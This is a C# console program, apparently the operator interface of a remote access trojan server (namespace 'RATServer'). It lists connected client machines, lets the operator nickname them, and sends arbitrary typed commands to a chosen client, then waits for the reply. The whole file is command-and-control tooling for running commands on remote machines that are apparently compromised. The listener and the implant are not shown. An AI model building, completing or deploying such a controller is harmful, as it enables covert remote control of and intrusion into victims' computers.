using GeneralPurposeLib;
using RATServer;

// Init everything
Logger.Init(LogLevel.Info);

Console.CancelKeyPress += (_, _) => {
    Logger.Info("Goodbye!");
};


// V2 - Actual CLI
Task ratListener = RatServerListener.StartListening();
Dictionary<string, string> nicknames = new(); // <id, name>

// -----------------------------------------------
// The menu where you chose what client to control
// -----------------------------------------------
clientsMenu:
Console.Clear();
Console.WriteLine("Clients:");
string[] clientsArray = RatServerListener.Clients.ToArray();
Console.ForegroundColor = ConsoleColor.Green;
for (int index = 0; index < clientsArray.Length; index++) {
    string clientId = clientsArray[index];
    Console.WriteLine($"{index}. {(nicknames.ContainsKey(clientId) ? nicknames[clientId] : clientId)}");
}
Console.ResetColor();
Console.Write("Enter an option or R to reload: ");
Console.ForegroundColor = ConsoleColor.Cyan;
string option = Console.ReadLine() ?? "";
Console.ResetColor();
if (option.ToLower() == "r") {
    goto clientsMenu;
}

if (!int.TryParse(option, out int selection)) {
    Console.WriteLine("Invalid Selection");
    goto clientsMenu;
}

// -------------------------------------
// The menu where you control the client
// -------------------------------------
string id = clientsArray[selection];
while (true) {  // Keep getting commands until the user types exit
    Console.ForegroundColor = ConsoleColor.Cyan;
    Console.Write(">> ");
    string command = Console.ReadLine() ?? "";
    Console.ResetColor();
    if (command == "exit") {
        break;
    }

    if (command.Split(' ')[0] == "nick" && command.Split(' ').Length > 1) {
        nicknames.Remove(id);  // Remove old nickname if it exists
        nicknames.Add(id, command.Split(' ')[1]);
        Console.WriteLine("Nickname set");
        continue;
    }
    if (command == "clear") {
        Console.Clear();
        continue;
    }
    RatServerListener.AwaitingResponse = true;
    RatServerListener.CommandsToRun.Add((id, command));

    if (command != "quit") {  // Don't wait for response if quitting because it will freeze
        while (RatServerListener.AwaitingResponse) { /* Wait for response */ }
    }
    
}
goto clientsMenu;